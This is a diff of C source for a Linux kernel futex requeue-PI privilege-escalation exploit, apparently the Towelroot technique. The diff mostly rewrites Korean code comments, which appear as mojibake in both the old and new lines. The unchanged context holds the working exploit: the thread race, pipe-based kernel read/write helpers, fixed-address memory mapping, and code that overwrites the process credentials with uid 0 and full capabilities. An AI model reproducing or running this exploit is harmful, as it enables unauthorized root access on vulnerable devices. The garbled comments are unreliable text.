@@ -16,13 +16,13 @@
 //#define FUTEX_WAIT_REQUEUE_PI   11
 //#define FUTEX_CMP_REQUEUE_PI    12
 
-// ARRAY_SIZE º¯¤¤¼ö Å©±â ±¸ÇÏ´Â ¸ÅÅ©·Î  ÇÔ¼ö.
+// ARRAY_SIZE ë³€ìˆ˜ í¬ê¸° êµ¬í•˜ëŠ” ë§¤í¬ë¡œ  í•¨ìˆ˜.
 #define ARRAY_SIZE(a)       (sizeof (a) / sizeof (*(a)))
 
-// Ä¿³Î ÁÖ¼Ò ½ÃÀÛ.
+// ì»¤ë„ ì£¼ì†Œ ì‹œì‘.
 #define KERNEL_START        0xc0000000
 
-// TCP ¼ÒÄÏ ´ë±â ¹øÈ£.
+// TCP ì†Œì¼“ ëŒ€ê¸° ë²ˆí˜¸.
 #define LOCAL_PORT      5551
 
 struct thread_info;
@@ -125,9 +125,9 @@ unsigned long MAGIC_ALT = 0;
 pthread_mutex_t *is_kernel_writing;
 pid_t last_tid = 0;
 int g_argc;
-char rootcmd[256]; // ÀÍ½ºÇÃ·ÎÀÕ ½ÇÇà ÀÎÀÚ ÀúÀåÇÒ º¯¼ö.
+char rootcmd[256]; // ìµìŠ¤í”Œë¡œì‡ ì‹¤í–‰ ì¸ì ì €ì¥í•  ë³€ìˆ˜.
 
-// readbuf¿¡¼­ count¸¸Å­ writebuf·Î ¾²±âÇÏ´Â ÇÔ¼ö.
+// readbufì—ì„œ countë§Œí¼ writebufë¡œ ì“°ê¸°í•˜ëŠ” í•¨ìˆ˜.
 //"copy from kernel" from writebuf to readbuf
 ssize_t read_pipe(void *writebuf, void *readbuf, size_t count) {
     int pipefd[2];
@@ -153,7 +153,7 @@ ssize_t read_pipe(void *writebuf, void *readbuf, size_t count) {
 }
 
 
-// writebuf¿¡¼­ readbuf·Î count¸¸Å­ ¾²±âÇÏ´Â ÇÔ¼ö.
+// writebufì—ì„œ readbufë¡œ countë§Œí¼ ì“°ê¸°í•˜ëŠ” í•¨ìˆ˜.
 //"copy to kernel" from writebuf to readbuf
 ssize_t write_pipe(void *readbuf, void *writebuf, size_t count) {
     int pipefd[2];
@@ -177,7 +177,7 @@ ssize_t write_pipe(void *readbuf, void *writebuf, size_t count) {
     return len;
 }
 
-// write_kernel (Ä¿³Î¿¡ Å©¸®µ§¼È ¸ğµÎ¸¦ ¾²±âÇØ¼­ ¸®ºÎÆÃÇÏ°í Á¤¸®ÇØ¼­ ±ÇÇÑÀ» »ó½Â½ÃÅ°´Â ±â´É)
+// write_kernel (ì»¤ë„ì— í¬ë¦¬ë´ì…œ ëª¨ë‘ë¥¼ ì“°ê¸°í•´ì„œ ë¦¬ë¶€íŒ…í•˜ê³  ì •ë¦¬í•´ì„œ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¤ëŠ” ê¸°ëŠ¥)
 void write_kernel(int signum)
 {
     struct thread_info stackbuf;
@@ -259,6 +259,7 @@ void write_kernel(int signum)
 
     read_pipe(cred, &credbuf, sizeof credbuf);
 
+    // credbuf.security ì½ìŒ.
     security = credbuf.security;
 
     if ((unsigned long)security > KERNEL_START && (unsigned long)security < 0xffff0000) {
@@ -275,10 +276,11 @@ void write_kernel(int signum)
 
             printf("task_security_struct: %p\n", security);
 
-            write_pipe(security, &securitybuf, sizeof securitybuf);
+            write_pipe(security, &securitybuf, sizeof securitybuf); // ë³´ì•ˆ ë²„í¼ ì“°ê¸°.
         }
     }
 
+	// í¬ë¦¬ë´ì…œ ë²„í¼ ì„¤ì •.
     credbuf.uid = 0;
     credbuf.gid = 0;
     credbuf.suid = 0;
@@ -288,6 +290,7 @@ void write_kernel(int signum)
     credbuf.fsuid = 0;
     credbuf.fsgid = 0;
 
+	// í¬ë¦¬ë´ì…œ ìº¡(ê¶Œí•œ) ì„¤ì •.
     credbuf.cap_inheritable.cap[0] = 0xffffffff;
     credbuf.cap_inheritable.cap[1] = 0xffffffff;
     credbuf.cap_permitted.cap[0] = 0xffffffff;
@@ -297,22 +300,25 @@ void write_kernel(int signum)
     credbuf.cap_bset.cap[0] = 0xffffffff;
     credbuf.cap_bset.cap[1] = 0xffffffff;
 
+	// í¬ë¦¬ë´ì…œ ë²„í¼ í¬ë¦¬ë´ì…œì— ì“°ê¸°í•¨.
     write_pipe(cred, &credbuf, sizeof credbuf);
 
+	// gettidë¡œ ì“°ë ˆë“œ ID ì¦‰ pidë¥¼ êµ¬í•¨.
     pid = syscall(__NR_gettid);
 
     for (i = 0; i < ARRAY_SIZE(taskbuf); i++) {
         static unsigned long write_value = 1;
 
         if (taskbuf[i] == pid) {
+			// taskbuf[i]ê°€ pidì™€ ê°™ìœ¼ë©´ write_pipe í•¨ìˆ˜ë¡œ write_valueë¥¼ stackbuf.task(ì»¤ë„ ìŠ¤íƒ íƒœìŠ¤í¬)ì— ë³µì‚¬í•¨.
             write_pipe(((void *)stackbuf.task) + (i << 2), &write_value, sizeof write_value);
 
             if (getuid() != 0) {
                 printf("ROOT FAILED\n");
-                while (1) {
+                while (1) { // ë£¨íŠ¸ ì‹¤íŒ¨ì‹œ ë¬´í•œ ë£¨í”„.
                     sleep(10);
                 }
-            } else {    //rooted
+            } else {    //rooted // ë£¨íŠ¸ ì„±ê³µì´ë©´ ì½”ë“œ ë¸Œë ˆì´í¬.
                 break;
             }
         }
@@ -357,7 +363,7 @@ void write_kernel(int signum)
     return;
 }
 
-// ½Ã±×³¯ actionÀ» ¼³Á¤ÇÏ´Â ÇÔ¼ö.
+// ì‹œê·¸ë‚  actionì„ ì„¤ì •í•˜ëŠ” í•¨ìˆ˜.
 void *make_action(void *arg) {
     int prio;
     struct sigaction act;
@@ -395,7 +401,7 @@ void *make_action(void *arg) {
     return NULL;
 }
 
-// action ¾²·¹µå¸¦ ´ë±âÇÏ´Â ÇÔ¼ö.
+// action ì“°ë ˆë“œë¥¼ ëŒ€ê¸°í•˜ëŠ” í•¨ìˆ˜.
 pid_t wake_actionthread(int prio) {
     pthread_t th4;
     pid_t pid;
@@ -462,7 +468,7 @@ pid_t wake_actionthread(int prio) {
 }
 
 //connect to :5551 and set the SNDBUF=1
-// 5551 Æ÷Æ®·Î ·ÎÄÃ È£½ºÆ® Á¢¼ÓÇÏ´Â ÇÔ¼ö.
+// 5551 í¬íŠ¸ë¡œ ë¡œì»¬ í˜¸ìŠ¤íŠ¸ ì ‘ì†í•˜ëŠ” í•¨ìˆ˜.
 int make_socket() {
     int sockfd;
     struct sockaddr_in addr = {0};
@@ -493,7 +499,7 @@ int make_socket() {
     return sockfd;
 }
 
-// MAGIC ¸Ş½ÃÁö¸¦ ¼ÒÄÏÀ¸·Î Àü¼ÛÇÏ´Â ÇÔ¼ö.
+// MAGIC ë©”ì‹œì§€ë¥¼ ì†Œì¼“ìœ¼ë¡œ ì „ì†¡í•˜ëŠ” í•¨ìˆ˜.
 void *send_magicmsg(void *arg) {
     int sockfd;
     struct mmsghdr msgvec[1];
@@ -557,7 +563,7 @@ void *send_magicmsg(void *arg) {
 }
 
 // setup_exploit:
-// mem º¯¼ö¿¡ ÀÍ½ºÇÃ·ÎÀÕ °ü·Ã °ª ¼³Á¤.
+// mem ë³€ìˆ˜ì— ìµìŠ¤í”Œë¡œì‡ ê´€ë ¨ ê°’ ì„¤ì •.
 static inline setup_exploit(unsigned long mem)
 {
     *((unsigned long *)(mem - 0x04)) = 0x81;
@@ -568,7 +574,7 @@ static inline setup_exploit(unsigned long mem)
     *((unsigned long *)(mem + 0x2c)) = mem + 8;
 }
 
-// search_goodnum ÇÔ¼ö ±â´É:
+// search_goodnum í•¨ìˆ˜ ê¸°ëŠ¥:
 
 void *search_goodnum(void *arg) {
     int ret;
@@ -584,13 +590,13 @@ void *search_goodnum(void *arg) {
     int i;
     char buf[0x1000];
 
-    // __NR_futex ½Ã½ºÅÛ Äİ È£Ãâ. (FUTEX_LOCK_PI)
+    // __NR_futex ì‹œìŠ¤í…œ ì½œ í˜¸ì¶œë¡œ futexë¥¼ ë½ ê±º (FUTEX_LOCK_PI)
     syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
 
     while (1) {
         //keep calling futex_requeue until the sendmagic thread called futex_wait_requeue_pi, 
         //then we have something to requeue.
-        // __NR_futex ½Ã½ºÅÛ Äİ È£Ãâ (FUTEX_CMP_REQUEUE_PI - ¸®Å¥).
+        // __NR_futex ì‹œìŠ¤í…œ ì½œ í˜¸ì¶œë¡œ íë¥¼ ë¦¬íí•¨ (FUTEX_CMP_REQUEUE_PI - ë¦¬í).
         ret = syscall(__NR_futex, &uaddr1, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr1);
         if (ret == 1) {
             break;
@@ -598,30 +604,30 @@ void *search_goodnum(void *arg) {
         usleep(10);
     }
 
-    // uaddr2ÀÇ rtmutex »óÀÇ ¾×¼Ç ½º·¹µå¸¦ ÀáÀç¿ò.
+    // uaddr2ì˜ rtmutex ìƒì˜ ì•¡ì…˜ ìŠ¤ë ˆë“œë¥¼ ì ì¬ì›€.
     wake_actionthread(6);//make sure the action thread is sleeping on rtmutex of uaddr2
-    // ´ë±â 2.
+    // ëŒ€ê¸° 2.
     wake_actionthread(7);//a waiter will be added to the plist(rbtree in 3.14 and higher) of rtmutex
 
     uaddr2 = 0;//key step
     do_socket_tid_read = 0;
     did_socket_tid_read = 0;
 
-	// __NR_futex ¸®Å¥.
+	// __NR_futex futex ë¦¬í.
     //because the uaddr2 == 0, we will get this lock at once! q.rt_waiter will be NULL
     syscall(__NR_futex, &uaddr2, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr2);
 
-    // do_socket_tid_read°¡ 0ÀÌ ¾Æ´Ï¸é ÄÚµå ºê·¹ÀÌÅ©. (¾²·¹µå°¡ ÇØ´ç º¯¼ö¸¦ 0ÀÌ ¾Æ´Ñ °ªÀ¸·Î ¹Ù²Ù¸é ºê·¹ÀÌÅ©).
+    // do_socket_tid_readê°€ 0ì´ ì•„ë‹ˆë©´ ì½”ë“œ ë¸Œë ˆì´í¬. (ì“°ë ˆë“œê°€ í•´ë‹¹ ë³€ìˆ˜ë¥¼ 0ì´ ì•„ë‹Œ ê°’ìœ¼ë¡œ ë°”ê¾¸ë©´ ë¸Œë ˆì´í¬).
     while (1) {
         if (do_socket_tid_read != 0) {
             break;
         }
     }
 
-    // ÅÂ½ºÅ© »óÅÂ¸¦ ÀĞÀ» ÆÄÀÏ¸í ±¸¼º.
+    // íƒœìŠ¤í¬ ìƒíƒœë¥¼ ì½ì„ íŒŒì¼ëª… êµ¬ì„±.
     sprintf(filename, "/proc/self/task/%d/status", waiter_thread_tid);
 
-    // ÅÂ½ºÅ© »óÅÂ ÆÄÀÏ ¿ÀÇÂ.
+    // íƒœìŠ¤í¬ ìƒíƒœ íŒŒì¼ ì˜¤í”ˆ.
     fp = fopen(filename, "rb");
 
     if (fp == 0) {
@@ -630,16 +636,16 @@ void *search_goodnum(void *arg) {
     else {
         fread(filebuf, 1, sizeof filebuf, fp);
         pdest = strstr(filebuf, "voluntary_ctxt_switches");
-        pdest += 0x19; // voluntary_ctxt_switches +0x19 = pdest º¯¼ö ÀÓ.
+        pdest += 0x19; // voluntary_ctxt_switches +0x19 = pdest ë³€ìˆ˜ ì„.
         vcscnt = atoi(pdest);
         fclose(fp);
     }
 
-    // did_socket_tid_read = 1·Î ¼³Á¤.
+    // did_socket_tid_read = 1ë¡œ ì„¤ì •.
     did_socket_tid_read = 1;
 
     while (1) {
-		// ÅÂ½ºÅ© »óÅÂ ¿ÀÇÂ.
+		// íƒœìŠ¤í¬ ìƒíƒœ ì˜¤í”ˆ.
         sprintf(filename, "/proc/self/task/%d/status", waiter_thread_tid);
         fp = fopen(filename, "rb");
 
@@ -647,21 +653,21 @@ void *search_goodnum(void *arg) {
             vcscnt2 = -1;
         }
         else {
-			// ÆÄÀÏÀ» ÀĞ¾î¼­ voluntary_ctxt_switches ¹®ÀÚ¿­À» °Ë»ö + 0x19 = pdest.
+			// íŒŒì¼ì„ ì½ì–´ì„œ voluntary_ctxt_switches ë¬¸ìì—´ì„ ê²€ìƒ‰ + 0x19 = pdest.
             fread(filebuf, 1, sizeof filebuf, fp);
             pdest = strstr(filebuf, "voluntary_ctxt_switches");
             pdest += 0x19;
-            vcscnt2 = atoi(pdest); // vcscnt2 = Á¤¼öÇü º¯È¯µÈ pdest ÀúÀå.
+            vcscnt2 = atoi(pdest); // vcscnt2 = ì •ìˆ˜í˜• ë³€í™˜ëœ pdest ì €ì¥.
             fclose(fp);
         }
 
-        if (vcscnt2 == vcscnt + 1) { // vcscnt2 == vcscnt +1°ú °°À¸¸é ºê·¹ÀÌÅ©.
+        if (vcscnt2 == vcscnt + 1) { // vcscnt2 == vcscnt +1ê³¼ ê°™ìœ¼ë©´ ë¸Œë ˆì´í¬.
             break;
         }
         usleep(10);
     }
 
-	// ¿©±â¿¡ ÀÖÀ¸¸é sendmsg ½Ã½ºÅÛ ÄİÀÌ Á¦´ë·Î ½ÇÇàµÇ¾ú´Ù´Â  °ÍÀ» ÀÇ¹ÌÇÕ´Ï´Ù.
+	// ì—¬ê¸°ì— ìˆìœ¼ë©´ sendmsg ì‹œìŠ¤í…œ ì½œì´ ì œëŒ€ë¡œ ì‹¤í–‰ë˜ì—ˆë‹¤ëŠ”  ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.
     //we get here means the sendmmsg syscall has been called successfully.
     printf("starting the dangerous things\n");
 
@@ -782,15 +788,15 @@ void *search_goodnum(void *arg) {
     return NULL;
 }
 
-// accept_socket() ±â´É.
-// TCP ¼­¹ö ¼ÒÄÏ ´ë±â ÈÄ accept() ¼º°øÇÏ¸é ¸®ÅÏÇÏ°í, ¾Æ´Ò ½Ã ¹«ÇÑ ·çÇÁ µµ´Â ÇÔ¼ö.
+// accept_socket() ê¸°ëŠ¥.
+// TCP ì„œë²„ ì†Œì¼“ ëŒ€ê¸° í›„ accept() ì„±ê³µí•˜ë©´ ë¦¬í„´í•˜ê³ , ì•„ë‹ ì‹œ ë¬´í•œ ë£¨í”„ ë„ëŠ” í•¨ìˆ˜.
 void *accept_socket(void *arg) {
     int sockfd;
     int yes;
     struct sockaddr_in addr = {0};
     int ret;
 
-    // TCP ¼ÒÄÏ ÇÏ³ª ÇÒ´ç.
+    // TCP ì†Œì¼“ í•˜ë‚˜ í• ë‹¹.
     sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
     yes = 1;
@@ -799,26 +805,26 @@ void *accept_socket(void *arg) {
     addr.sin_family = AF_INET;
     addr.sin_port = htons(LOCAL_PORT); // LOCAL_PORT=5551
     addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
-    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)); // ¹ÙÀÎµå.
+    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)); // ë°”ì¸ë“œ.
 
-    listen(sockfd, 1); // ¼­¹ö ¼ÒÄÏ ÇÏ³ª ´ë±â.
+    listen(sockfd, 1); // ì„œë²„ ì†Œì¼“ í•˜ë‚˜ ëŒ€ê¸°.
 
     while(1) {
-        ret = accept(sockfd, NULL, NULL); // Á¢¼Ó ¤² ¤¿¤§À½.
+        ret = accept(sockfd, NULL, NULL); // ì ‘ì† ã…‚ ã…ã„·ìŒ.
         if (ret < 0) {
             printf("**** SOCK_PROC failed ****\n");
             while(1) {
                 sleep(10);
             }
         } else {
-            printf("i have a client like hookers.\n"); // ¼ÒÄÏ ¼º°ø½Ã ¸®ÅÏ.
+            printf("i have a client like hookers.\n"); // ì†Œì¼“ ì„±ê³µì‹œ ë¦¬í„´.
         }
     }
 
     return NULL;
 }
 
-// init_exploit: ÀÍ½ºÇÃ·ÎÀÕ ½ÇÇà ±â´É.
+// init_exploit: ìµìŠ¤í”Œë¡œì‡ ì‹¤í–‰ ê¸°ëŠ¥.
 /*
 	call path:
 		[th1]: accept_socket()
@@ -831,12 +837,12 @@ void init_exploit() {
 
     printf("running with pid %d\n", getpid());
 
-    // accept_socket() ÇÔ¼ö¸¦ th1(¾²·¹µå 1)·Î »ı¼º.
+    // accept_socket() í•¨ìˆ˜ë¥¼ th1(ì“°ë ˆë“œ 1)ë¡œ ìƒì„±.
     pthread_create(&th1, NULL, accept_socket, NULL);
 
-    // 0xa0000000¿¡ 0x110000±æÀÌÀÇ ÀÍ¸í ¸Ş¸ğ¸®¸¦ ÆäÀÌÁö¸¦ ¸ÊÇÎ.
+    // 0xa0000000ì— 0x110000ê¸¸ì´ì˜ ìµëª… ë©”ëª¨ë¦¬ë¥¼ í˜ì´ì§€ë¥¼ ë§µí•‘.
     addr = (unsigned long)mmap((void *)0xa0000000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
-    addr += 0x800; // MAGIC = +0x800 ¿ÀÇÁ¼Â.
+    addr += 0x800; // MAGIC = +0x800 ì˜¤í”„ì…‹.
     MAGIC = addr;
 
     if ((long)addr >= 0) {
@@ -846,7 +852,7 @@ void init_exploit() {
         }
     }
 
-    // addr = 0x100000¿¡ 0x110000 Å©±âÀÇ ÀÍ¸í ¸Ş¸ğ¸® ÆäÀÌÁö¸¦ ¸ÊÇÎ.
+    // addr = 0x100000ì— 0x110000 í¬ê¸°ì˜ ìµëª… ë©”ëª¨ë¦¬ í˜ì´ì§€ë¥¼ ë§µí•‘.
     addr = (unsigned long)mmap((void *)0x100000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
     addr += 0x800;
     MAGIC_ALT = addr; // MAGIC_ALT = addr+0x800
@@ -858,7 +864,7 @@ void init_exploit() {
         }
     }
 
-    // search_goodnum(), send_magicmsg() µÎ ÇÔ¼ö¸¦ ¾²·¹µå·Î ½ÇÇà.
+    // search_goodnum(), send_magicmsg() ë‘ í•¨ìˆ˜ë¥¼ ì“°ë ˆë“œë¡œ ì‹¤í–‰.
     pthread_mutex_lock(&done_lock);
     pthread_create(&th2, NULL, search_goodnum, NULL);
     pthread_create(&th3, NULL, send_magicmsg, NULL);
@@ -869,10 +875,10 @@ int main(int argc, char **argv) {
     g_argc = argc;
 
     if (argc >= 2) {
-        strncpy(rootcmd, argv[1], sizeof(rootcmd) - 1); // rootcmd¿¡ ÀÍ½ºÇÃ·ÎÀÕ ½ÇÇà ÀÎÀÚ º¹»ç. 
+        strncpy(rootcmd, argv[1], sizeof(rootcmd) - 1); // rootcmdì— ìµìŠ¤í”Œë¡œì‡ ì‹¤í–‰ ì¸ì ë³µì‚¬. 
     }
 
-    init_exploit(); // init_exploit·Î ÀÍ½ºÇÃ·ÎÀÕ ½ÇÇà.
+    init_exploit(); // init_exploitë¡œ ìµìŠ¤í”Œë¡œì‡ ì‹¤í–‰.
 
     printf("Finished, looping.\n");
 
